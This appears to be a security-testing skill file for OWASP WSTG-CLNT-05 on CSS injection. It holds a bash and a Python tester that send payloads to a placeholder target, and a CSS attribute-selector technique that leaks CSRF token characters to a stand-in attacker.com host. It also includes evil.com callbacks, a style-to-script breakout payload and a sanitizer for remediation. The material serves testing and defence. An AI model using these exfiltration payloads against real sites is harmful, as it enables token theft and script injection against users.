---
name: wstg-clnt-05
description: "Testing for CSS Injection"
category: client-side
owasp_id: WSTG-CLNT-05
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-94]
chains_with: []
prerequisites: []
severity_boost: {}
sha256: 6d39d0c74b3106697c22fdbb1a65ed6430cf428c9b9e8854988424236e8626b7
signature: IgwHdviBflpId8obaqNT0dLifgqpTubEus4djhoDCxnpxY/TTqWOUiElP1ylC+utT+s6rGHt7XPdw15IuO21Cg==
signed_by: cyberstrike-official
---

# wstg-clnt-05

## Test ID

WSTG-CLNT-05

## Test Name

Testing for CSS Injection

## High-Level Description

CSS injection allows attackers to inject malicious CSS into web pages. While typically less severe than XSS, it can be used for data exfiltration (via attribute selectors), UI redressing, content spoofing, and in some cases, JavaScript execution in older browsers.

---

## What to Check

- [ ] Style attribute injection
- [ ] CSS in user-controlled content
- [ ] @import directive injection
- [ ] expression() in IE
- [ ] Data exfiltration via CSS

---

## How to Test

### Step 1: Basic CSS Injection

```bash
#!/bin/bash
TARGET="https://target.com"

payloads=(
    "color:red"
    "background:url(https://evil.com/log?data=stolen)"
    "position:fixed;top:0;left:0;width:100%;height:100%;background:red"
    "}</style><script>alert(1)</script><style>"
)

for payload in "${payloads[@]}"; do
    response=$(curl -s "$TARGET/profile?style=$payload")
    echo "Testing: $payload"
done
```

### Step 2: Data Exfiltration via CSS

```css
/* CSS attribute selector exfiltration */
/* Can extract CSRF tokens, input values */

input[name="csrf"][value^="a"] {
  background: url(https://attacker.com/log?csrf=a);
}
input[name="csrf"][value^="b"] {
  background: url(https://attacker.com/log?csrf=b);
}
/* ... repeat for each character */
```

### Step 3: CSS Injection Testing Script

```python
#!/usr/bin/env python3
import requests

class CSSInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_style_injection(self, endpoint, param):
        """Test for CSS injection"""
        print(f"[*] Testing CSS injection: {endpoint}")

        payloads = [
            ("color:red", "color:red"),
            ("background:url(//evil.com)", "background:url"),
            ("</style><script>alert(1)</script>", "<script>"),
        ]

        for payload, check in payloads:
            url = f"{self.base_url}{endpoint}"
            response = requests.get(url, params={param: payload})

            if check in response.text:
                print(f"[VULN] CSS injection: {payload[:30]}")
                self.findings.append({
                    "endpoint": endpoint,
                    "payload": payload,
                    "severity": "Medium"
                })

# Usage
tester = CSSInjectionTester("https://target.com")
tester.test_style_injection("/profile", "theme")
```

---

## Remediation

```python
# Sanitize CSS input - only allow safe properties
import re

ALLOWED_CSS = {
    'color': r'^#[0-9a-fA-F]{3,6}$|^(red|blue|green|black|white)$',
    'font-size': r'^\d+(px|em|rem)$',
    'background-color': r'^#[0-9a-fA-F]{3,6}$',
}

def sanitize_css(property_name, value):
    if property_name in ALLOWED_CSS:
        if re.match(ALLOWED_CSS[property_name], value):
            return f"{property_name}: {value}"
    return ""
```

---

## Risk Assessment

| Finding               | CVSS | Severity |
| --------------------- | ---- | -------- |
| CSS data exfiltration | 4.3  | Medium   |
| UI redressing via CSS | 3.5  | Low      |

---

## CWE Categories

| CWE ID     | Title                                                 |
| ---------- | ----------------------------------------------------- |
| **CWE-74** | Improper Neutralization of Special Elements in Output |

sha256: 7734171eed6aecdcb48474b8472eb336ba78752bdd167118492fd643199ccb86
signature: bwEy6mTaZ5RNCT9XHyC+6qReeQv21SWIl7xhy/+1CuHcBcyTDxsODEg6DN3RnY55fwGrtt9TNel2OSBGMuVRAQ==
signed_by: cyberstrike-official
---

## Checklist

```
[ ] Style attributes tested
[ ] CSS properties analyzed
[ ] Data exfiltration tested
[ ] XSS via CSS tested
[ ] Findings documented
```
